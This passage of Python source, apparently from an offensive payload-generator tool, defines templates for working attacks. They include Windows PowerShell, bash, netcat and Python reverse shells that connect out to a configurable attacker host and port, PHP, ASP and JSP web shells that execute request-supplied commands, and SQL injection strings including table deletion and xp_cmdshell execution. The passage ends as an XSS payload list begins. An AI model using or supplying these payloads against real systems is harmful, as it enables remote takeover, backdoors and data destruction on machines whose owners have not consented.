    ...
    def __init__(self):
        self.payload_templates = {
            'windows_reverse_shell': {
                ...
                'cmd': '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''
            },
            'linux_reverse_shell': {
                'bash': '''bash -i >& /dev/tcp/{host}/{port} 0>&1''',
                'netcat': '''nc -e /bin/sh {host} {port}''',
                'python': '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'  ''',
            ...
            'web_shells': {
                'php': '''<?php if(isset($_REQUEST['cmd'])) {{ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }} ?><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>"><input type="TEXT" name="cmd" size="80"><input type="SUBMIT" value="Execute"></form>''',
                'asp': '''<%@ Language=VBScript %><%eval request("cmd")%>''',
                'jsp': '''<% if(request.getParameter("cmd") != null) {{ out.println("<pre>"); Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); out.println(org.apache.commons.io.IOUtils.toString(p.getInputStream())); out.println("</pre>"); }} %><form><input name="cmd" size="50"><input type=submit value="Execute"></form>'''
            },
            'sql_injection': {
                'mysql': ["' OR '1'='1", "' UNION SELECT NULL,NULL,NULL--", "'; DROP TABLE users; --"],
                'mssql': ["' OR '1'='1", "'; EXEC xp_cmdshell('whoami'); --", "' UNION SELECT NULL,@@version,NULL--"],
                'oracle': ["' OR '1'='1", "' UNION SELECT NULL,NULL,NULL FROM dual--", "'; EXEC IMMEDIATE 'SELECT * FROM v$version'; --"]
            },
            'xss_payloads': [
